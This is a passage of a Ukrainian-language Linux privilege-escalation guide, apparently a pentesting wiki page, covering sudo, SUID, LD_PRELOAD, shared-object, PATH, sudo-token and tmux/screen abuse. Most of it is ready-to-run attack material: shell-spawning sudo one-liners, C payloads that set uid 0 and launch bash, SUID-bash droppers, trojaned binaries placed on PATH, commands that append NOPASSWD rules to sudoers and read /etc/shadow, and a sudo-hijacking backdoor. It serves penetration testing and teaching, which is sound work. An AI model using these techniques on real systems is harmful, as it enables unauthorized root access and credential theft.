D-Bus працює за моделлю **allow/deny model**, керуючи дозволами на повідомлення (виклики методів, емісії сигналів тощо) на основі кумулятивного застосування відповідних правил політики. Ці політики визначають взаємодію з шиною, потенційно дозволяючи privilege escalation через експлуатацію відповідних дозволів.

Нижче наведено приклад такої політики в `/etc/dbus-1/system.d/wpa_supplicant.conf`, що деталізує дозволи для користувача root володіти, надсилати і отримувати повідомлення від `fi.w1.wpa_supplicant1`.

Політики без вказаного користувача або групи застосовуються універсально, тоді як політики в контексті "default" застосовуються до всіх, хто не охоплений іншими специфічними політиками.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Дізнайтеся тут, як enumerate та exploit D-Bus communication:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво enumerate мережу й з'ясувати позицію машини.

### Загальна enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо можете, ви зможете захопити деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Загальна перевірка

Перевірте, **хто** ви, які у вас **привілеї**, які **користувачі** є в системі, які можуть **login** і які мають **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були вразливі через баг, який дозволяє користувачам з **UID > INT_MAX** підвищувати привілеї. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи ви є **членом якоїсь групи**, яка могла б надати вам root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти як кожен користувач**, використовуючи цей пароль.

### Su Brute

Якщо вас не бентежить створення великого шуму і на комп'ютері присутні бінарні файли `su` та `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записуваних директорій у PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку із $PATH**, ви можете підвищити привілеї, **створивши backdoor всередині записуваної папки** з ім'ям якоїсь команди, яка буде виконана іншим користувачем (бажано root) і яка **не завантажується з папки, що знаходиться раніше** за вашу записувану папку в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати певні команди за допомогою sudo або ці команди можуть мати suid-біт. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **неочікувані команди дозволяють читати та/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачеві виконувати певну команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`, і тепер тривіально отримати shell, додавши ssh key у root directory або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачу **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **на основі HTB machine Admirer**, був **vulnerable** до **PYTHONPATH hijacking**, щоб завантажити довільну бібліотеку python під час виконання скрипта як root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете скористатися неінтерактивною поведінкою запуску Bash, щоб виконати довільний код від імені root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних шелів Bash оцінює `$BASH_ENV` і підключає цей файл перед виконанням цільового скрипта. Багато правил sudo дозволяють запускати скрипт або shell-обгортку. Якщо `BASH_ENV` зберігається sudo, ваш файл буде підключено з привілеями root.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` неінтерактивно, або будь-який bash-скрипт).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Підвищення безпеки:
- Видаліть `BASH_ENV` (та `ENV`) з `env_keep`, віддайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed команд; використовуйте мінімальні бінарні файли.
- Розгляньте sudo I/O logging та оповіщення, коли використовуються збережені env vars.

### Terraform via sudo with preserved HOME (!env_reset)

Якщо sudo залишає середовище незмінним (`!env_reset`) і дозволяє `terraform apply`, `$HOME` залишається як у викликача. Тому Terraform завантажує **$HOME/.terraformrc** від імені root і враховує `provider_installation.dev_overrides`.

- Вкажіть потрібний provider на директорію з правом запису і помістіть шкідливий плагін з ім'ям провайдера (наприклад, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform не пройде Go plugin handshake, але виконає payload від root перед тим як завершитись, залишаючи після себе SUID shell.

### Перевизначення TF_VAR + обхід валідації symlink'ами

Значення змінних Terraform можна передавати через змінні оточення `TF_VAR_<name>`, які зберігаються, якщо sudo зберігає оточення. Слабкі перевірки, такі як `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")`, можна обійти за допомогою symlink'ів:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **запису** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

На деяких старіших дистрибутивах sudo може бути налаштовано з `requiretty`, що змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або опція відсутня), sudo може виконуватися з неінтерактивних контекстів, таких як reverse shells, cron jobs або scripts.
```bash
Defaults !requiretty
```
Це не є прямою вразливістю саме по собі, але розширює ситуації, в яких правила sudo можна зловживати без необхідності повного PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path`, що містить записи, доступні для запису зловмисником (наприклад, `/home/<user>/bin`), будь-яка команда з відносним шляхом всередині дозволеної sudo цілі може бути затінена.

- Вимоги: правило sudo (часто `NOPASSWD`), що запускає скрипт/бінарний файл, який викликає команди без абсолютних шляхів (`free`, `df`, `ps` тощо), та запис у PATH, доступний для запису, який шукається першим.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Обхід шляхів виконання Sudo
**Перейти** щоб читати інші файли або використовувати **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо користувачу надано **sudo permission** для однієї команди **без вказання шляху**: _hacker10 ALL= (root) less_ — ви можете експлуатувати це, змінивши змінну PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використовувати, якщо **suid** binary **виконує іншу команду без вказання шляху до неї (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary зі шляхом до команди

Якщо **suid** binary **виконує іншу команду з вказаним шляхом**, тоді ви можете спробувати **експортувати функцію**, названу так само, як команда, яку викликає suid файл.

Наприклад, якщо **suid** binary викликає _**/usr/sbin/service apache2 start**_ ви маєте спробувати створити функцію і експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Тоді, коли ви викликаєте suid бінарний файл, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна оточення **LD_PRELOAD** використовується для вказання однієї або декількох спільних бібліотек (.so файлів), які мають бути завантажені завантажувачем перед усіма іншими, включно зі стандартною C бібліотекою (`libc.so`). Цей процес відомий як попереднє завантаження бібліотеки.

Однак, щоб підтримувати безпеку системи та запобігти зловживанню цією можливістю, особливо стосовно виконуваних файлів **suid/sgid**, система застосовує певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором (_euid_).
- Для виконуваних файлів з suid/sgid попередньо завантажуються лише бібліотеки, що знаходяться у стандартних шляхах і які також мають suid/sgid.

Ескалація привілеїв може статися, якщо ви маєте можливість виконувати команди з `sudo` і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній оточення **LD_PRELOAD** зберігатися і бути розпізнаною навіть під час виконання команд з `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** за допомогою:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** що виконується
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо зловмисник контролює env variable **LD_LIBRARY_PATH**, оскільки він контролює шлях, за яким будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли ви натрапляєте на binary з правами **SUID**, що виглядають підозріло, корисно перевірити, чи він правильно завантажує **.so** файли. Це можна перевірити, виконавши таку команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб експлуатувати це, потрібно створити C-файл, наприклад _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї, маніпулюючи правами доступу до файлів і запустивши shell з підвищеними привілеями.

Скомпілюйте вищенаведений C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск уразливого SUID binary повинен запустити exploit, дозволяючи потенційне скомпрометування системи.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID бінарний файл, який завантажує бібліотеку з папки, в яку ми можемо записувати, створимо бібліотеку в цій папці з потрібною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримаєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що згенерована вами бібліотека повинна містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix-бінарних файлів, які може використати зловмисник, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **тільки додавати аргументи** в команду.

Проект збирає легітимні функції Unix-бінарників, які можна зловживати, щоб виходити з restricted shells, escalate or maintain elevated privileges, передавати файли, створювати bind and reverse shells та полегшувати інші post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знаходить він спосіб експлуатації будь-якого правила sudo.

### Reusing Sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підвищити привілеї, **очікуючи виконання sudo-команди і потім перехопивши сесійний токен**.

Вимоги для підвищення привілеїв:

- У вас вже є shell під користувачем "_sampleuser_"
- "_sampleuser_" повинен був **використовувати `sudo`** для виконання чогось протягом **останніх 15 хвилин** (за замовчуванням це тривалість sudo token, що дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово встановити ptrace_scope у 0 за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або постійно змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконано, **ви можете підвищити привілеї, використавши:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Перший **exploit** (`exploit.sh`) створить бінарник `activate_sudo_token` у _/tmp_. Ви можете використати його, щоб **активувати sudo token у вашій сесії** (ви автоматично не отримаєте root shell, виконайте `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Цей **second exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **третій exploit** (`exploit_v3.sh`) створить **sudoers file**, який робить **sudo tokens вічними та дозволяє всім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** у цій теці або над будь-яким із створених у ній файлів, ви можете використати бінарник [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell під цим користувачем з PID 1234, ви можете **obtain sudo privileges** без необхідності знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися тільки користувачем root та групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **підвищити привілеї**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо ви можете записувати, ви можете зловживати цим дозволом.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживання цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD, не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини і використовує `sudo`** для підвищення привілеїв, і ви отримали shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконуватиме ваш код від імені root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, запускався ваш виконуваний файл sudo.

Зверніть увагу, що якщо користувач користується іншим shell (не bash), вам доведеться змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ви можете знайти інший приклад у [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільні бібліотеки

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться завантажені конфігураційні файли**. Зазвичай цей файл містить такий рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть прочитані конфігураційні файли з `/etc/ld.so.conf.d/*.conf`. Ці конфігураційні файли **вказують на інші папки**, де будуть **шукатися бібліотеки**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** в будь-який з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-який файл всередині `/etc/ld.so.conf.d/` або будь-яку папку, вказану у конфігурації в `/etc/ld.so.conf.d/*.conf`, він може мати можливість підвищити привілеї.\
Подивіться, **як експлуатувати цю неправильну конфігурацію** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Якщо скопіювати lib у `/var/tmp/flag15/`, програма використовуватиме її в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Можливості Linux надають процесу **підмножину доступних прав root**. Це фактично розбиває права root на **менші та відмінні одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про можливості та як ними зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорії

У директорії **біт "execute"** означає, що відповідний користувач може "**cd**" у папку.\
Біт **"read"** означає, що користувач може **переглядати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Access Control Lists (ACLs) представляють вторинний рівень дискреційних дозволів, здатний **перевизначати традиційні ugo/rwx дозволи**. Ці дозволи покращують контроль доступу до файлів або директорій, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не входять до групи. Такий рівень **деталізації забезпечує більш точне управління доступом**. Детальніше можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачу "kali" права читання та запису до файлу:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs у системі:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell sessions

У **старих версіях** ви можете **hijack** певну **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen sessions вашого **власного користувача**. Проте, ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Переглянути screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема зі **старими версіями tmux**. Мені не вдалося hijack tmux (v2.1) session, створену root, коли я був non-privileged user.

**Перелік tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Перегляньте приклад у **Valentine box from HTB**.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH ключі, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 і 13 травня 2008 року, можуть бути вразливі до цієї помилки.\
Ця помилка виникає під час створення нового ssh key в цих ОС, оскільки було можливим лише **32,768 варіантів**. Це означає, що всі можливості можна перебрати, і, **маючи ssh public key, ви можете знайти відповідний private key**. Розраховані можливості можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Цікаві параметри конфігурації

- **PasswordAuthentication:** Визначає, чи дозволена аутентифікація за паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена аутентифікація за public key. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли аутентифікація паролем дозволена, вказує, чи дозволяє сервер вхід у облікові записи з порожнім паролем. За замовчуванням — `no`.

### PermitRootLogin

Визначає, чи може root входити через ssh; за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти, використовуючи пароль та private key
- `without-password` or `prohibit-password`: root може входити лише за допомогою private key
- `forced-commands-only`: Root може входити тільки з private key та якщо вказано параметри команд
- `no` : ні

### AuthorizedKeysFile

Визначає файли, які містять public keys, що можуть бути використані для аутентифікації користувача. Вони можуть містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказувати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти за допомогою **приватного** ключа користувача "**testusername**", ssh порівняє публічний ключ вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **використовувати локальні SSH ключі замість того, щоб залишати ключі** (without passphrases!) на вашому сервері. Отже, ви зможете **перейти** via ssh **на один хост** і звідти **перейти на інший** хост **використовуючи** **ключ**, розташований на вашому **початковому хості**.

Ви повинні встановити цю опцію в `$HOME/.ssh.config` таким чином:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` є `*`, то щоразу, коли користувач підключається до іншої машини, той хост зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перезаписати** ці **опції** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — allow).

Якщо ви виявите, що Forward Agent налаштований у середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати ним для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає новий shell**. Тому, якщо ви можете **записати або змінити будь-який з них, ви можете ескалювати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено підозрілий профільний скрипт, слід перевірити його на **чутливі дані**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати їхні резервні копії. Тому рекомендується **знайти всі з них** та **перевірити, чи можна їх прочитати**, щоб дізнатись **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Іноді у файлі `/etc/passwd` (або еквівалентному) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd доступний для запису

Спочатку згенеруйте пароль за допомогою однієї з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Потім додайте користувача `hacker` та додайте згенерований пароль.
```
